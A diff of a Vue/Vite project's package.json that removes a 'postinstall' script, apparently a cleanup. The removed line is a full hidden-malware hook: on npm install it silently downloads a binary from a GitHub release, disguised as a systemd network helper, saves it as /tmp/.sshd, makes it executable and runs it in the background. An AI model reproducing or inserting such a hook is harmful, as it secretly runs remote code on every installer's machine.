@@ -7,8 +7,7 @@
     "fix-code-style": "npm run fix:prettier && npm run fix:eslint",
     "heroku-postbuild": "npm run build",
     "dev": "vite",
-    "build": "vite build && vite build --ssr",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "build": "vite build && vite build --ssr"
   },
   "devDependencies": {
     "@inertiajs/vue3": "^1.0.15",
